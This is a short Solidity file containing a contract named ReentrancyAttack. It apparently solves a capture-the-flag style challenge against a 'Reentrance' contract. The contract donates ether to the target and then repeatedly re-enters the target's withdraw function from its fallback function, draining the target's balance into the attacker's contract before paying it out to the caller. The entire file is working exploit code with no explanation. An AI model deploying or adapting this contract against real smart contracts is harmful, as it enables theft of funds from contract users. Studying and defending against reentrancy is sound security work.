contract ReentrancyAttack {
    Reentrance target;
    uint donationStarter;

    constructor(address payable _target) public payable {
        target = Reentrance(_target);
        donationStarter = msg.value;
        target.donate.value(msg.value)(address(this));
    }

    function reentracyAttack() public {
        target.withdraw(donationStarter);
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    fallback() external payable {
        reentracyAttack();
    }
}